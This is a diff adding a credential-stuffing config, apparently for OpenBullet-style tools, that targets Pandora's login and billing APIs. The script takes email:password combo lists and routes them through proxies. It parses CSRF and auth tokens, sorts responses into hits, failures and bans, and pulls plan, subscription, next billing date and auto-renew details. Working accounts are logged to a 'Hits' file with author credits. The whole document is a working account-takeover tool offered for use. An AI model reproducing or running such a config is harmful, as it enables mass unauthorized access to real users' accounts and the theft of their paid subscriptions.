@@ -1,0 +1,119 @@
+[SETTINGS]
+{
+  "Name": "Pandora",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-01-15T15:17:10.6534625+02:00",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.pandora.com/account/sign-in" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#tk PARSE "<COOKIES(csrftoken)>" LR "" "" -> VAR "tk" 
+
+REQUEST POST "https://www.pandora.com/api/v1/auth/login" 
+  CONTENT "{\"existingAuthToken\":null,\"username\":\"<USER>\",\"password\":\"<PASS>\",\"keepLoggedIn\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.pandora.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-CsrfToken: <tk>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" 
+  HEADER "Origin: https://www.pandora.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.pandora.com/account/sign-in" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#tk2 PARSE "<SOURCE>" LR "authToken\":\"" "\"" -> VAR "tk2" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username and/or password" 
+    KEY "Missing required parameter: username" 
+    KEY "AUTH_INVALID_USERNAME_PASSWORD" 
+  KEYCHAIN Success OR 
+    KEY "authToken\":\"" 
+  KEYCHAIN Ban OR 
+    KEY "The request could not be validated" 
+    KEY "INVALID_REQUEST" 
+
+#Plan PARSE "<SOURCE>" LR "branding\":\"" "\"" CreateEmpty=FALSE -> CAP "Plan" 
+
+REQUEST POST "https://www.pandora.com/api/v1/billing/infoV2" 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.pandora.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-AuthToken: <tk2>" 
+  HEADER "X-CsrfToken: <tk>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" 
+  HEADER "Origin: https://www.pandora.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.pandora.com/settings/subscription" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "subscriber\":false" 
+  KEYCHAIN Success OR 
+    KEY "subscriber\":true" 
+
+#Next_Billing PARSE "<SOURCE>" LR "nextBillingDate\":\"" "T" CreateEmpty=FALSE -> CAP "Next Billing" 
+
+#Auto_Renew PARSE "<SOURCE>" LR "autoRenew\":" ",\"" CreateEmpty=FALSE -> CAP "Auto Renew" 
+  
+
+
+UTILITY File "Pandora Hits.txt" AppendLines "Combo : <USER>:<PASS> | Mail : <USER> | Pass : <PASS> | Plan : <Plan> | Next Billing : <Next Billing> | Auto Renew : <Auto Renew> | Config By : @KingKaracz" 
